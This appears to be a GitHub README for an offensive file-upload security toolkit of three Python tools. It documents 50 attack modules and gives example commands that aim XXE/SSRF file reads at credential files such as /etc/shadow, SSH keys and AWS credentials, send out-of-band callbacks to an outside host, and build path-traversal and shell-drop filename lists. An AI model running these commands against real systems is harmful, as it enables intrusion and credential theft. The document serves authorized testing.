<div align="center">

```
                        ...........
                   .....................
               ..............................
            .....................................
          .......................................:.
        ........................................::::.
      .........................  ...............::::::.
       .........   .     ......   ...............::::::.
            .                      ................::::..
                                   .......................
                                   ..::....................
                                   .:::::::.................
.                                  .::::::::::::............
..                           ..    ::::::::::::::::::.......
..        ...              ..     .::::::::::::::::::.......
..           .:.         .:.       :::::::::::::::::::......
..             .:.      .:         .::::::::::::::::::......
 .               .:.  ..:          .::::::::::::::::........
 .                .:.  :.          .:::::::::::::::........
                   :...:            .::..:::::::::........
                    .....           .::.....::...........
                   . .. .           ....................
                   . ...            ...................
                     .... .          .................
                     :... ::::.      ...............
                     : .:.00000:.     ............
                  :::: ..:0000000::::::::......
                 :000.  .:0000000000000000:
                        .000000000000:
                           .:00:.

        ██╗   ██╗██╗   ██╗███╗   ███╗ █████╗ ██████╗
        ██║   ██║██║   ██║████╗ ████║██╔══██╗██╔══██╗
        ██║   ██║██║   ██║██╔████╔██║███████║██████╔╝
        ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝
        ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║
         ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝

              Unrestricted Upload Map · by @0xbugatti
```

<img src="https://github.com/0xbugatti.png" width="140" height="140" style="border-radius:50%; border: 3px solid #00fff7; box-shadow: 0 0 20px #00fff7;" alt="0xBugatti" />

![Python](https://img.shields.io/badge/Python-3.8%2B-cyan?style=for-the-badge&logo=python&logoColor=white&labelColor=0d0d0d)
![Modules](https://img.shields.io/badge/Attack_Modules-50-red?style=for-the-badge&labelColor=0d0d0d)
![License](https://img.shields.io/badge/License-MIT-magenta?style=for-the-badge&labelColor=0d0d0d)
![Standalone](https://img.shields.io/badge/Standalone-No_Burp_Required-green?style=for-the-badge&labelColor=0d0d0d)
![Author](https://img.shields.io/badge/Author-0xBugatti-orange?style=for-the-badge&labelColor=0d0d0d)

---

*The most complete file upload security assessment toolkit ever built.*
*50 modules. 13 generators. 8 + 4 techniques. One paths.json. Zero compromises.*

</div>

---

## Table of Contents

1. [Overview](#overview)
2. [The Three Tools](#the-three-tools)
3. [Why This Family](#why-this-family)
4. [Installation](#installation)
5. [The `paths.json` Registry](#the-pathsjson-registry)
6. [The `--file-read` Override](#the---file-read-override)
7. [Quick Start](#quick-start)
   - [UpMap (live scanner)](#upmap--live-scanner)
   - [UpGen (offline payload bodies)](#upgen--offline-payload-bodies)
   - [Upname (filename wordlists)](#upname--filename-wordlists)
8. [Combined Workflows](#combined-workflows)
9. [Attack Inventory](#attack-inventory)
10. [Output Layout](#output-layout)
11. [CLI Reference](#cli-reference)
12. [Architecture & Internals](#architecture--internals)
13. [Maintenance Workflow](#maintenance-workflow)
14. [Tips & Troubleshooting](#tips--troubleshooting)
15. [Legal & Disclaimer](#legal--disclaimer)

---

## Overview

The **File-Upload Arsenal** is a three-tool Python toolkit for authorized
file-upload security testing — pentest engagements, CTF challenges, and
defensive research. Every tool is a **single self-contained `.py` file** with
its own embedded copy of the shared registry, so each runs offline with no
configuration files to deploy.

The three tools split the work cleanly:

| Tool | Purpose | Network? | External deps |
|------|---------|----------|---------------|
| **UpMap.py** | Live scanner — uploads payloads, verifies execution | Yes | `requests` (mandatory), `beautifulsoup4` (optional) |
| **UpGen.py** | Offline payload-**body** generator | No | Standard library only |
| **Upname.py** | Offline filename **wordlist** generator | No | Standard library only |

A single canonical file, **`paths.json`** (590+ known-file paths, organized
into Linux / Windows / web-roots / DevOps-cloud / cloud-metadata / SSRF
targets), is embedded into all three tools and reachable via `@key.path`
lookups from every `--file-read` and `--webroot` flag.

---

## The Three Tools

```
┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│   ┌──────────────┐      ┌──────────────┐      ┌──────────────┐     │
│   │   UpGen.py   │      │   Upname.py  │      │   UpMap.py   │     │
│   │   (BODIES)   │      │  (FILENAMES) │      │    (LIVE)    │     │
│   └──────┬───────┘      └──────┬───────┘      └──────┬───────┘     │
│          │                     │                     │             │
│          │                     │                     │             │
│          ▼                     ▼                     ▼             │
│   shell.php,             ../etc/passwd.jpg,    POST /upload        │
│   xxe_oast.xml,          shell.pHp.jpg,        with body+name,     │
│   ssrf.svg,...           name%00.jpg,...       verifies exec.      │
│                                                                     │
│          ╲                     ╱                                    │
│           ╲                   ╱                                     │
│            ╲                 ╱                                      │
│             ▼               ▼                                       │
│           Feed both into UpMap, Burp Intruder, or ffuf.             │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### UpMap.py — *Unrestricted Upload Map*

The live scanner. Point it at an upload URL (or a Burp request file) and it
runs **50 attack modules** that upload + verify in one pass. Covers
extension bypasses, RCE shells, XXE/XSS/SSRF/SSI/ESI, image-processing CVEs
(ImageTragick / Ghostscript / libavformat), Office-XML XXE, archive
traversal, PDF exploits, known-CVE endpoints, and content/wordlist fuzzers.

**Key capabilities:**
- 7 upload transports (multipart / raw PUT / JSON-b64 / JSON-raw / XML / urlencoded / templated)
- Multi-target sweeps via `--targets file.txt`
- Resume from interrupted scans (state on disk)
- Threaded module execution via `-T N`
- OAST / OOB support (interactsh, Burp Collaborator)
- BeautifulSoup form auto-discovery
- CSRF-aware (scrapes hidden tokens, refreshes on 419)
- Custom shell injection (`--shell s.php`, `--cmd-param x`)
- RCE verification (`-D /uploads/` — GETs the stored shell and confirms execution)
- 256-color terminal UI with finding highlights

### UpGen.py — *Offline Upload-Attack Payload Generator*

Generates payload **bodies** to disk so you can review, edit, or upload them
by hand. **13 generators** (`bypass`, `filename`, `config`, `rce`, `xxe`,
`xss`, `ssrf`, `esi`, `images`, `pdf`, `csv`, `zip`, `fuzz`) covering every
file body the live scanner ships.

**Why offline:**
- Audit payloads before they hit a target.
- Run them through a custom delivery layer (Frida, Burp Repeater, a CI hook).
- Build a per-language test corpus once and reuse across engagements.
- Works with **zero network**.

Each payload is written to a per-extension subfolder, named
`<NNNN>_<attacktype>_<handle>.<ext>` for deterministic ordering.

### Upname.py — *Upload-Filename Wordlist Generator*

Generates per-language `.txt` wordlists of mutated/injected **filenames**
for Burp Intruder, ffuf, or any tool that loops over a multipart
`filename=` field.

Two selector groups:
- **`--technique` (8)** — filter-bypass families that smuggle `.php` past
  validation: `extension_shuffle`, `double_extension`, `null_byte_cutoff`,
  `stripping_extension`, `discrepancy`, `name_overflow`,
  `special_char_bypass`, `wordlist_fuzzer`.
- **`--attack` (4)** — injection families where the filename CARRIES the
  payload: `path_traversal_filename`, `xss_filename`, `sqli_filename`,
  `command_injection_filename`.

Output is split into `_raw.txt` (literal bytes — NUL-byte safe, Burp
multipart-ready) and `_urlenc.txt` (URL-encoded, delivery-layer safe), so
you pick the encoding that matches your consumer.

---

## Why This Family

| Advantage | What it means |
|---|---|
| **Clean division of labor** | Bodies vs. filenames vs. live delivery — never mixed, never coupled. Use any subset standalone. |
| **One paths.json, three tools** | Edit one file, re-embed once, all three are in sync. No drift, no copy-paste. |
| **Self-contained Python files** | Each tool ships its own embedded registry. Move a `.py` file alone — it still works. |
| **`@key.path` resolution everywhere** | `--file-read @linux.credentials` works identically in all three tools. |
| **Directory-aware** | Refuses literal dir paths; filters dir leaves from `@key` results; allows dirs only where they make sense (`--webroot`). |
| **Five-language coverage** | PHP / ASP(.NET) / JSP / ColdFusion / Perl-CGI, with byte-identical exec-extension tables across UpGen + Upname. |
| **OAST / OOB support** | XXE, SSRF, ESI, blind-XSS — every OOB payload has a fallback for offline runs. |
| **RCE verification** | UpMap doesn't just upload — it GETs the stored file and confirms code execution. |
| **Override semantics** | One `--file-read PATH` flag retargets every LFI payload in UpGen and UpMap (XXE, SSI, SSRF `file://`, php://filter, Ghostscript `.libfile`, CSV HYPERLINK, etc.). |
| **Unified styling** | Same logo, same color palette, same `--list` UX. Cognitive load = zero when switching tools. |
| **Zero-dep offline core** | UpGen and Upname need only Python 3.8+. UpMap adds `requests` (and optional `beautifulsoup4` for form auto-discovery). |

---

## Installation

```bash
git clone https://github.com/0xbugatti/UpMap.git
cd UpMap

# Minimal: UpGen + Upname work standalone with the stdlib.
python UpGen.py  --list
python Upname.py --list

# Full: UpMap needs `requests` (mandatory) + optionally `beautifulsoup4`.
pip install requests beautifulsoup4
python UpMap.py  --list
```

**Requirements:**

| Tool | Python | Mandatory | Optional |
|------|--------|-----------|----------|
| UpGen | 3.8+ | — | — |
| Upname | 3.8+ | — | — |
| UpMap | 3.8+ | `requests` | `beautifulsoup4` (form auto-discovery) |

No build step. No virtualenv required. Just clone and run.

---

## The `paths.json` Registry

`paths.json` is the canonical known-paths registry shipped alongside the three
tools. It carries **590+ leaves** organized into six top-level categories:

| Top-level key | What it holds | Used by |
|---|---|---|
| `linux` | 9 subcategories — system_info, network, process_runtime, credentials, shell_history, logs, scheduled_tasks, mail_spool, app_configs | `--file-read` (all three) |
| `windows` | 7 subcategories — system_info, registry_hives, credentials, shell_history, logs, iis, third_party_creds | `--file-read` (all three) |
| `webroots` | 7 per-language subcategories — php, asp, aspx, jsp, coldfusion, perl_cgi, static | Upname `--webroot` (drop-target dirs) |
| `devops_cloud` | 12 subcategories — docker, kubernetes, aws, gcp, azure, cicd, scm, iac, secrets_managers, containers_runtime, env_files, databases | `--file-read` |
| `cloud_metadata_endpoints` | **File-based** cloud-init / waagent / GCE-agent artifacts — 7 providers | `--file-read` (LFI-safe; file paths only) |
| `ssrf_targets` | **URL-based** IMDS / metadata endpoints — 12 providers | Reserved for SSRF; never routed through `--file-read` |

**The bright-line rule:** `cloud_metadata_endpoints` is **files**;
`ssrf_targets` is **URLs**. The resolver enforces this split — file-read
consumers see file paths, SSRF consumers see URLs. No leakage.

### `@key.path` resolution

Every `--file-read` (and Upname's `--webroot`) accepts either a literal path
**or** an `@key.path` lookup into the registry:

```bash
--file-read /etc/passwd                  # literal
--file-read @linux.credentials           # resolves to /etc/shadow, /etc/sudoers, ~/.ssh/*, ...
--file-read @linux.credentials.id_rsa    # drill down to a single file
--file-read @devops_cloud.aws            # ~/.aws/credentials, ~/.aws/config, ...
--file-read @cloud_metadata_endpoints.aws # /var/lib/cloud/data/instance-id, etc.
--file-read @windows.iis                 # web.config, applicationHost.config, ...
```

The walker collects every string leaf under the key, **silently filtering
directory entries** (trailing `/` or `\`) so consumers never get a path
they can't `read()`. Single-target consumers (UpMap, UpGen) pick the first
leaf; wordlist consumers (Upname `path_traversal_filename`) fan out to
every leaf.

### Placeholders

Some entries carry placeholders that are documented in `$placeholders`:

| Placeholder | Meaning |
|---|---|
| `{USER}` | Non-root username on shared / multi-user box |
| `{DOMAIN}` | vhost domain name |
| `{APP}` | IIS site/application name |
| `{VERSION}` | Tool version segment (e.g. PHP 8.2, PostgreSQL 14) |
| `{TOMCAT_VER}` | Tomcat major.minor |
| `{YYMMDD}` | IIS log date suffix |
| `{HOSTNAME}` | Machine short hostname (MySQL/XAMPP `.err` files) |

---

## The `--file-read` Override

A single flag in all three tools retargets every LFI-bearing payload:

```bash
# UpMap: every _lfi(ctx, …) site (XXE, SSI, SSRF, CSV HYPERLINK, Ghostscript)
python UpMap.py -u https://target/upload --file-read @linux.credentials

# UpGen: every _lfi / _lfi_urlenc / _lfi_charref site
python UpGen.py xxe -E php --file-read @windows.iis

# Upname: path_traversal_filename READ-mode targets (wordlist fan-out)
python Upname.py path_traversal_filename -E php --file-read @linux.credentials
```

**Override semantics (UpMap, UpGen — single-target):**

- Unset → each payload keeps its hardcoded default (`/etc/passwd`, `win.ini`, `/etc/hostname`, …).
- Literal path → used verbatim.
- `@key` → first resolved leaf wins.

**Override semantics (Upname — wordlist):**

- Unset → READ-mode emits one set of traversal payloads for `/etc/passwd`.
- `@key` → emits a set for **every** resolved leaf (true wordlist fan-out).

**Encoded variants follow the override.** In UpGen, the URL-encoded and
char-ref XXE bypass payloads automatically wrap the override path:

```
--file-read /proc/self/environ
   → file:///proc/self/environ          (raw)
   → file://%2Fproc%2Fself%2Fenviron    (urlenc)
   → file://%252Fproc%252Fself%252F…    (double-urlenc)
   → file:///&#x70;roc/self/environ     (char-ref bypass)
```

**Directory refusal (C3):** If you pass a literal directory path (trailing
`/` or `\`) the tool refuses with a clear error rather than silently
producing a broken payload:

```
$ python UpGen.py xxe -E php --file-read /etc/cron.d/
UpGen.py: error: --file-read '/etc/cron.d/' is a directory path. Specify
a file inside it (e.g. /etc/cron.d/foo.conf) — LFI payloads cannot 'read'
a directory.
```

`@key` resolution silently drops dir leaves from multi-leaf results (so
`@linux` cleanly yields the 193 readable files under it). A `@key.path`
that resolves to a *single* directory is also refused.

---

## Quick Start

### UpMap — Live Scanner

```bash
# Auto-discover form, scan everything, OAST callbacks via interactsh
python UpMap.py -u https://target.com/upload \
                --oast https://abc.oast.fun \
                -D /uploads/ -T 6 -R

# Run a subset of modules
python UpMap.py -u https://target/upload --field file \
                -m xxe_xml,xxe_svg,xss_svg,ssrf_url

# Replay a captured Burp request (markers auto-inserted)
python UpMap.py -r request.txt --field file

# Sweep 100 hosts from a file
python UpMap.py --targets targets.txt -T 8 --resume scan.state

# Override every LFI payload to read SSH keys instead of /etc/passwd
python UpMap.py -u https://target/upload --file-read @linux.credentials

# List all modules
python UpMap.py --list
```

### UpGen — Offline Payload Bodies

```bash
# Generate every attack type for every language
python UpGen.py all -o out/

# Just XXE, for PHP backends, with @key override
python UpGen.py xxe -E php --file-read @windows.iis -o out/

# RCE shells in three langs (custom shell injection)
python UpGen.py rce -E asp --shell my_shell.aspx --cmd-param x

# Custom OAST host embedded in XXE/SSRF/ESI payloads
python UpGen.py xxe ssrf esi --oast https://abc.oast.fun

# List all 13 generators
python UpGen.py --list
```

### Upname — Filename Wordlists

```bash
# Filter-bypass technique set for PHP
python Upname.py extension_shuffle double_extension null_byte_cutoff -E php

# Every technique + every attack for ASP
python Upname.py --technique all --attack all -E asp -A png

# Path-traversal READ targets (wordlist fan-out across the credentials category)
python Upname.py path_traversal_filename -E php --file-read @linux.credentials

# Path-traversal WRITE targets (drop shell into known webroot dirs)
python Upname.py path_traversal_filename -E php --webroot @webroots.php.linux

# Mega rollup: union of every technique into one all.txt per language
python Upname.py all --mega -o wordlists/

# Deterministic by default; --seed shuffles for WAF dodging
python Upname.py wordlist_fuzzer -E php --seed 1337
```

---

## Combined Workflows

### 1. Generate offline, deliver via UpMap

```bash
# Step 1: build a PHP body corpus offline
python UpGen.py all -E php -o /tmp/upgen_php/

# Step 2: build a filename wordlist with traversal targets
python Upname.py all --mega -E php \
       --file-read @linux.credentials \
       --webroot   @webroots.php.linux \
       -o /tmp/upname_php/

# Step 3: live-scan with the wordlist as the filename source
python UpMap.py -u https://target/upload --field file \
       --filename-list /tmp/upname_php/php/all.txt
```

### 2. UpMap + Burp Repeater (no live UpMap run)

```bash
# Generate every body
python UpGen.py xxe xss ssrf rce -E asp -o ./bodies/

# Drag a body into Burp Repeater, swap @key targets as needed
```

### 3. Fan out one technique across all five backends

```bash
# Produces ./out/{php,asp,jsp,coldfusion,perl}/technique/...
python Upname.py null_byte_cutoff -E all -o ./out/
```

### 4. Read the same file with three encodings via UpGen

```bash
# UpGen automatically emits raw + urlenc + double-urlenc + char-ref forms
# of every XXE bypass payload, each pre-wrapped around the override target.
python UpGen.py xxe -E php --file-read /proc/self/environ -o ./encoded/
```

---

## Attack Inventory

### UpMap — 50 attack modules

Grouped by phase (the live execution order is also `--list` order):

```
EXTENSION & FILENAME (8)
   mime_spoofing, double_extension, extension_shuffle, null_byte_cutoff,
   stripping_extension, discrepancy, name_overflow, special_char_bypass

DATA-URI & OBFUSCATION (2)
   data_uri_upload, php_obfuscation

FILENAME INJECTION (1)
   path_traversal_filename

CONFIG OVERWRITE (3)
   htaccess_overwrite, web_config_overwrite, config_file_upload

CODE EXECUTION (5)
   php_rce, asp_rce, asp_obfuscation, jsp_rce, jsp_obfuscation, cgi_rce

SSI / POLYGLOTS (3)
   ssi_injection, polyglot_php_jpeg, image_steganography

XXE (4)
   xxe_xml, xxe_svg, xxe_xmp, docx_xxe

XSS (3)
   xss_svg, xss_html, xss_polyglot

SSRF / ESI (3)
   svg_ssrf, ssrf_url, url_file_ssrf

ESI (1)
   esi_injection

IMAGE-PROCESSING CVEs (5)
   imagetragick_sleep, imagetragick_oast, imagemagick_mvg,
   ghostscript, libavformat_ssrf

POLYGLOTS / PDF / ZIP (3)
   polyglot_image_rce, pdf_exploit, zip_traversal

DETECTION (3)
   eicar_detection, fingerping, known_cve_endpoints, swf_xss

FUZZING & MISC (3)
   wordlist_fuzzer, content_fuzzer, dos_crashfiles, zip_split_obfuscation
```

### UpGen — 13 generators

| Generator | Label |
|---|---|
| `bypass` | Bypass / Evasion |
| `filename` | Filename / Path Injection |
| `config` | Config / Handler Abuse |
| `rce` | RCE / Code Execution |
| `xxe` | XXE |
| `xss` | XSS |
| `ssrf` | SSRF |
| `esi` | ESI |
| `images` | Image / Media CVEs |
| `pdf` | PDF |
| `csv` | CSV |
| `zip` | Archive / ZIP |
| `fuzz` | Fuzzing / DoS |

### Upname — 8 techniques + 4 attacks

| Technique | What it does |
|---|---|
| `extension_shuffle` | Alt exec extensions + case variants |
| `double_extension` | `shell.php.jpg` / `shell.jpg.php` / `shell.php.php` |
| `null_byte_cutoff` | 10 terminators (NUL/`;`/space/newline/CRLF/…) × 2 positions |
| `stripping_extension` | Recursive-strip dodge (`.p.phphp` / `.pphphp` / …) |
| `discrepancy` | Dot-encoding mismatch (`%2e`/`%252e`/fullwidth/trailing) |
| `name_overflow` | Pad to 236 / 255 / 4096-byte truncation thresholds |
| `special_char_bypass` | Trailing dot/space, ADS, RTL, reserved names |
| `wordlist_fuzzer` | Kitchen-sink — union of every technique above |

| Attack | What it does |
|---|---|
| `path_traversal_filename` | Traversal to read system file OR drop shell into webroot |
| `xss_filename` | XSS payload as filename (fires when name is echoed in HTML) |
| `sqli_filename` | SQLi payload as filename (fires on INSERT into uploads table) |
| `command_injection_filename` | Command-injection as filename (fires when passed to `system()`) |

---

## Output Layout

### UpGen

```
UpGen_out/
├── php/
│   ├── 0001_rce_0xbugatti.php
│   ├── 0002_xxe_oob_0xbugatti.xml
│   ├── 0003_xxe_bypass_urlenc_0xbugatti.xml
│   └── ...
├── asp/
├── jsp/
├── coldfusion/
└── perl/
```

### Upname

```
Upname_out/
├── php/
│   ├── _README.txt
│   ├── technique/
│   │   ├── extension_shuffle.txt
│   │   ├── double_extension.txt
│   │   ├── null_byte_cutoff_raw.txt        ← contains NUL bytes
│   │   ├── null_byte_cutoff_urlenc.txt     ← URL-encoded equivalent
│   │   └── ...
│   ├── attack/
│   │   ├── path_traversal_filename_raw.txt
│   │   ├── path_traversal_filename_urlenc.txt
│   │   ├── xss_filename.txt
│   │   ├── sqli_filename.txt
│   │   └── command_injection_filename.txt
│   └── all.txt              ← optional, --mega
├── asp/
├── jsp/
└── ...
```

**Why the `_raw` / `_urlenc` split?** Techniques carrying binary or control
bytes (NUL, CRLF, fullwidth Unicode) emit BOTH files:
- `_raw.txt` — literal bytes; what Burp's multipart `filename=` field expects.
- `_urlenc.txt` — printable; what already-encoded delivery layers consume.

Lines with raw `\n`/`\r` are skipped from `_raw.txt` (would break the
wordlist format); their semantic equivalent lives in `_urlenc.txt` as
`%0a` / `%0d%0a`.

---

## CLI Reference

```bash
python UpMap.py  --help
python UpGen.py  --help
python Upname.py --help

python UpMap.py  --list      # 50 modules, grouped by phase
python UpGen.py  --list      # 13 generators
python Upname.py --list      # 8 techniques + 4 attacks + 5 languages
```

All three accept the same `@key` syntax for `--file-read`. Upname adds
`--webroot @webroots.<lang>.<os>` for path-traversal WRITE-mode targets.

---

## Architecture & Internals

### One source of truth, three independents

```
                     ┌───────────────┐
                     │  paths.json   │  ◀── canonical
                     └──────┬────────┘
                            │ python _embed_paths.py
              ┌─────────────┼─────────────┐
              │             │             │
              ▼             ▼             ▼
        ┌─────────┐   ┌─────────┐   ┌─────────┐
        │ UpGen.py│   │ UpMap.py│   │Upname.py│
        │  +data  │   │  +data  │   │  +data  │
        └─────────┘   └─────────┘   └─────────┘
```

`_embed_paths.py` reads `paths.json` and injects it as a raw string literal
into each tool, plus the shared helper code (`_is_dir_path`,
`_resolve_paths_key`, `_validate_file_read_or_die`). The injection is
idempotent — re-run after every `paths.json` edit.

### Resolver semantics

```python
_resolve_paths_key(key, registry=None, allow_dirs=False)
```

- `key` literal (no `@`) → `[key]`
- `@cat.sub.leaf` → walk the tree, collect every string leaf, skip
  `$`-prefixed meta keys, filter dir-style leaves unless `allow_dirs=True`.
- Trailing-`/` URLs (like `http://169.254.169.254/latest/meta-data/`) are
  **not** treated as dirs — the predicate exempts known URL schemes.
- Returns `None` when the key can't be resolved (CLI then errors clearly).

### Per-language executable extension tables

`UpGen.EXT` (body-side) and `Upname.EXEC_EXTS` (filename-side) carry the
same union per language — synchronized verbatim:

| Language | Extensions |
|---|---|
| `php` | php, php2-7, phtml, phtm, phar, pht, phps, pgif, inc, hphp, ctp, module (17) |
| `asp` | asp, aspx, asa, asax, ashx, asmx, aspq, axd, cer, cdx, config, cshtm, cshtml, rem, shtml, soap, vbhtm, vbhtml, xamlx (19) |
| `jsp` | jsp, jspx, jsw, jsv, jspf, wss, do, action (8) |
| `coldfusion` | cfm, cfml, cfc, cfr, dbm (5) |
| `perl` | pl, cgi, perl, pm, plx (5) |

Add an extension to one, mirror it into the other — the two lists are kept
identical by design.

---

## Maintenance Workflow

```bash
# 1. Edit the canonical paths.json
$EDITOR paths.json

# 2. Re-embed into all three tools
python _embed_paths.py

# 3. Compile-check
python -m py_compile UpGen.py UpMap.py Upname.py

# 4. Sanity tests
python UpGen.py  --list
python Upname.py --list
python UpMap.py  --list
```

**Adding a new exec extension:** update both `UpGen.EXT` and
`Upname.EXEC_EXTS` (with the leading dot in Upname) and the
`UpMap.target_lang()` accept-set if the new extension belongs to a
language family the scanner routes via `-E`.

---

## Tips & Troubleshooting

- **Windows console looks weird** — all three tools force `sys.stdout` /
  `sys.stderr` to UTF-8 on startup, so arrows and color codes render
  correctly. If you're piping to a file, you can set `NO_COLOR=1` to
  suppress ANSI.
- **`--file-read @something` silently does nothing on the wire** — your
  `@key` resolved to zero file leaves (all entries were dirs or `$`-meta).
  Drill down to a more specific key or use a literal path.
- **`@webroots.php.linux` resolves to nothing in `--file-read`** — by
  design. `webroots` entries are directories; they're write-mode targets,
  consumed by Upname's `--webroot`, not `--file-read`.
- **No external paths.json present** — every tool ships its own embedded
  copy. The external file is the canonical edit point, never a runtime
  requirement. Move `UpGen.py` alone to a clean machine and it still works.
- **UpMap exits with "Provide -u URL, -r request.txt, or --targets …"** —
  the live scanner needs a target. UpGen and Upname do not.
- **Custom shell in UpGen does not fire `--file-read`** — that's correct.
  `--file-read` overrides LFI payloads only; RCE shells already execute
  arbitrary code and have no "file target" to retarget.

---

## Legal & Disclaimer

These tools are intended exclusively for **authorized security testing**:
penetration testing engagements with written scope, CTF challenges,
bug-bounty programs within the program's scope, and defensive research on
systems you own or have explicit permission to test.

Using this toolkit against systems you do not have authorization to test
is illegal in most jurisdictions. **The author accepts no liability for
misuse.** You are responsible for ensuring your use complies with all
applicable laws and contracts.

---

<div align="center">

```
                              by  @0xbugatti
                              ──────────────
                                  MIT
```

</div>
